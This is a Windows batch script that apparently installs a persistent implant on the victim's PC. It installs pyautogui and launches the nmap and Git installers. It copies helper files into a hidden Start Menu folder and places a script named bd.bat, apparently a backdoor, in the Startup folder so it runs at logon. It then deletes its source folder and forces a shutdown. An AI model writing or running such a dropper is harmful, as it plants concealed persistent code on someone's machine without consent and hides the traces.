@echo OFF
C:

python -m pip install pyautogui

cd %UserProfile%\Escritorio\Bamby\
start nmap-7.92-setup.exe
start Git-2.35.1.2-64-bit.exe
cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu"
md Bambi
cd Bambi

xcopy %UserProfile%\Escritorio\Bamby\disable.py "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Escritorio\Bamby\installer.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Bambi" /O /X /E /H /K
xcopy %UserProfile%\Escritorio\Bamby\bd.bat "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /O /X /E /H /K

cd %UserProfile%\Escritorio\
rmdir %UserProfile%\Escritorio\Bamby

timeout /nobreak 2
shutdown /f /s